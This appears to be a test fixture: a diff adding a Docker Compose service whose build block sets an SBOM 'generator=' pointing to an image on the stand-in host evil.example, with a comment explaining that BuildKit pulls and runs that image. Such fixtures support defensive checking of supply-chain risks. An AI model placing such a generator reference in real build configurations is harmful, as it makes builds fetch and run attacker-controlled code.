@@ -1,0 +1,9 @@
+# Fixture: build attestations are not used; an SBOM generator= names an image that BuildKit pulls and runs.
+services:
+  a:
+    image: expense-tracker-a:dev
+    build:
+      context: .
+      dockerfile: Dockerfile.pinned
+      sbom: "generator=evil.example/scanner:latest"
+      provenance: true
